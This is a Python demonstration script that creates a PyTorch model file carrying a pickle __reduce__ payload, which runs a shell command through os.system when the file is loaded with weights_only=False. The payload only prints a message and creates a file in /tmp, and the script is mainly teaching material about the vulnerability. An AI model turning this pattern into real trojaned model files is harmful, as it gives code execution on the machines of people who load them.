#!/usr/bin/env python3
"""
Creates a malicious PyTorch model file that executes code when loaded
Demonstrates pickle deserialization vulnerability
"""

import pickle
import torch
import os
from pathlib import Path

class MaliciousPayload:
    """
    This class will execute arbitrary code when unpickled.
    The __reduce__ method is called during deserialization.
    """
    def __reduce__(self):
        # This is the payload that executes when the pickle is loaded
        cmd = "echo 'ALERT: Malicious code executed!' && touch /tmp/pwned_by_pickle.txt"
        return (os.system, (cmd,))

def create_malicious_model():
    """
    Create a pickle file that looks like a PyTorch model
    but contains malicious code
    """
    print("Creating malicious model file...")

    # The "model" is actually just our malicious payload
    malicious_model = MaliciousPayload()

    # Save it like a normal PyTorch model using torch.save()
    # This creates a proper PyTorch format file
    model_path = Path(__file__).parent / "malicious_model.pt"
    torch.save(malicious_model, model_path)

    print(f"🥒 Malicious model created: {model_path}")
    print("\nThis file will execute code when loaded with torch.load()")
    print("The payload will:")
    print("  1. Print a warning message")
    print("  2. Create /tmp/pwned_by_pickle.txt")

    return model_path

def demonstrate_attack():
    """Show what happens when the malicious model is loaded"""
    model_path = Path(__file__).parent / "malicious_model.pt"

    if not model_path.exists():
        print("Malicious model not found. Creating it first...")
        create_malicious_model()
        print("\n" + "="*60)

    print("\n🥒🚨 DANGER ZONE: Loading the malicious model...")
    print("="*60)

    # Clean up previous evidence
    if os.path.exists("/tmp/pwned_by_pickle.txt"):
        os.remove("/tmp/pwned_by_pickle.txt")

    print("\nBefore load: /tmp/pwned_by_pickle.txt exists?",
          os.path.exists("/tmp/pwned_by_pickle.txt"))

    # PyTorch 2.6+ defaults to weights_only=True (safe-ish)
    # But users often disable it for compatibility...
    print("\n⚠️  PyTorch 2.6+ blocks this by default with weights_only=True")
    print("    But many users set weights_only=False for 'compatibility'...")
    print("")
    print("Loading with weights_only=False (VULNERABLE):")

    # This is the vulnerable line - it executes the malicious code
    _ = torch.load(model_path, weights_only=False)

    print("\nAfter load: /tmp/pwned_by_pickle.txt exists?",
          os.path.exists("/tmp/pwned_by_pickle.txt"))

    if os.path.exists("/tmp/pwned_by_pickle.txt"):
        print("\n🥒🔴 EXPLOIT SUCCESSFUL! Arbitrary code was executed.")
        print("In a real attack, this could:")
        print("  - Steal credentials")
        print("  - Install backdoors")
        print("  - Exfiltrate data")
        print("  - Compromise the entire system")

if __name__ == "__main__":
    import sys

    if len(sys.argv) > 1 and sys.argv[1] == "attack":
        demonstrate_attack()
    else:
        create_malicious_model()
        print("\nTo demonstrate the attack, run:")
        print(f"  python {Path(__file__).name} attack")
